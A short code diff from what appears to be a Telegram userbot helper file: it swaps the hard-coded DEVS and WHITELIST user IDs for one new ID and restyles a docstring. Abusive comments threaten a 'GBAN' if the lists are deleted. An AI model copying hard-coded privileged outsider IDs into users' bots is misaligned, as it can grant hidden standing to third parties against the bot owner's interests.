@@ -8,7 +8,7 @@ from X.helpers.interval import IntervalHelper
 
 
 async def CheckAdmin(client: Client, message: Message):
-    """Check if we are an admin."""
+    """ᴄʜᴇᴄᴋ ɪғ ᴡᴇ ᴀʀᴇ ᴀɴ ᴀᴅᴍɪɴ."""
     admin = "administrator"
     creator = "creator"
     ranks = [admin, creator]
@@ -71,21 +71,13 @@ async def RestrictFailed(message: Message):
 # DON'T NEED TO DELETE IT, YOU FOOL
 # DELETED = GBAN
 DEVS = [ 
-    6694740726,
-    6517565595,
-    6668774864,
-    6257927828,
-    6450051680,
+    7117906157,
  
 ]
 
 WHITELIST = [
-    6694740726,  # NOBITA XD
-    6517565595,  # Rayen
-    6257927828, # Kunal
-    6668774864, # Mirza
-    6450051680, #TryToLiveAlon_owner
-  
+    7117906157,  # DICTATOR
+    
 ]
 
 # DON'T DELETE IT, YOU BASTARD PIG DICK DOG
